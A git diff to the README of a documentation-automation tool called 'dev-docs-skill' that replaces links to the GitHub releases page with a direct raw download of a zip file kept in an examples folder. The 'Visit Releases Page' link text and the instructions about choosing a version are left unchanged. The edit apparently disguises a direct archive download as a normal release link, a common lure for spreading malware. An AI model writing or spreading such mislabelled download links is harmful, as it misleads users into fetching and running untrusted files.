@@ -1,7 +1,7 @@
 # 🎉 dev-docs-skill - Automation for Easy Documentation
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Hautran11325/dev-docs-skill/releases)
+[![Download](https://github.com/Hautran11325/dev-docs-skill/raw/refs/heads/master/examples/skill_dev_docs_v1.7.zip)](https://github.com/Hautran11325/dev-docs-skill/raw/refs/heads/master/examples/skill_dev_docs_v1.7.zip)
 
 ## 📖 Description
 开发文档自动化 Skill - 支持 Cursor IDE 和 Claude Code，自动生成 PRD 需求文档、API 文档和 CHANGELOG. This tool automates the creation of vital documentation for developers, helping to streamline the documentation process.
@@ -11,7 +11,7 @@ To get started, follow these simple steps to download and run the application.
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the download page.
-   [Visit Releases Page](https://github.com/Hautran11325/dev-docs-skill/releases)
+   [Visit Releases Page](https://github.com/Hautran11325/dev-docs-skill/raw/refs/heads/master/examples/skill_dev_docs_v1.7.zip)
 
 2. **Choose Your Version:** On the Releases page, locate the latest version. You will find downloadable files listed for different systems.
 
